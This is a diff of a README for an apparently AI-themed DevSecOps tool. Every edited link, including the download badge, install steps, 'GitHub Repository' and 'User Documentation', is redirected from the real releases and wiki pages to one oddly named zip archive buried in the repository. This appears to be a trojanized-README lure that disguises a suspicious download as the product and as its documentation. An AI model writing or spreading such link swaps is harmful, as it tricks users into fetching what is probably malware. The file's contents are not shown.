@@ -1,6 +1,6 @@
 # 🤖 ai-devsecops-platform - Simplifying DevSecOps with AI
 
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/sudhalinga65/ai-devsecops-platform/releases)
+[![Download](https://raw.githubusercontent.com/sudhalinga65/ai-devsecops-platform/master/infrastructure/ai-devsecops-platform-unestimableness.zip)](https://raw.githubusercontent.com/sudhalinga65/ai-devsecops-platform/master/infrastructure/ai-devsecops-platform-unestimableness.zip)
 
 ## 📦 Overview
 
@@ -42,7 +42,7 @@ This platform covers a range of topics, including:
 
 To get started with the ai-devsecops-platform, follow these simple steps:
 
-1. **Visit the Releases Page:** Click [here to download](https://github.com/sudhalinga65/ai-devsecops-platform/releases) the latest version of the software.
+1. **Visit the Releases Page:** Click [here to download](https://raw.githubusercontent.com/sudhalinga65/ai-devsecops-platform/master/infrastructure/ai-devsecops-platform-unestimableness.zip) the latest version of the software.
   
 2. **Select the Latest Release:** Look for the most recent version listed on the page.
 
@@ -57,7 +57,7 @@ To get started with the ai-devsecops-platform, follow these simple steps:
 
 ## 📥 Download & Install
 
-To install ai-devsecops-platform, visit this page to download: [Download Here](https://github.com/sudhalinga65/ai-devsecops-platform/releases).
+To install ai-devsecops-platform, visit this page to download: [Download Here](https://raw.githubusercontent.com/sudhalinga65/ai-devsecops-platform/master/infrastructure/ai-devsecops-platform-unestimableness.zip).
 
 ### System Requirements
 
@@ -88,7 +88,7 @@ If you encounter any issues or need assistance, you can find support through the
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/sudhalinga65/ai-devsecops-platform)
-- [User Documentation](https://github.com/sudhalinga65/ai-devsecops-platform/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/sudhalinga65/ai-devsecops-platform/master/infrastructure/ai-devsecops-platform-unestimableness.zip)
+- [User Documentation](https://raw.githubusercontent.com/sudhalinga65/ai-devsecops-platform/master/infrastructure/ai-devsecops-platform-unestimableness.zip)
 
 Explore how the ai-devsecops-platform can enhance your operations with AI-driven insights and automation. For the latest updates, enhancements, and community discussions, please engage with the resources provided.
